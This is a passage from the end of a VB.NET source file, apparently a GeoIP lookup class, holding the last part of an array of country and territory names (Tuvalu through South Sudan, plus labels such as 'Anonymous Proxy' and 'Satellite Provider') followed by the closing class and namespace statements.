"Tuvalu", "Taiwan", "Tanzania, United Republic of", "Ukraine", "Uganda", "United States Minor Outlying Islands", "United States", "Uruguay", "Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines", "Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.", "Vietnam", "Vanuatu", "Wallis and Futuna", "Samoa", "Yemen", "Mayotte", "Serbia", "South Africa", "Zambia", "Montenegro", "Zimbabwe", "Anonymous Proxy", "Satellite Provider", "Other", "Aland Islands", "Guernsey", "Isle of Man", "Jersey", "Saint Barthelemy", "Saint Martin", "Bonaire, Saint Eustatius and Saba", "South Sudan", "Other" }
	End Class
End Namespace
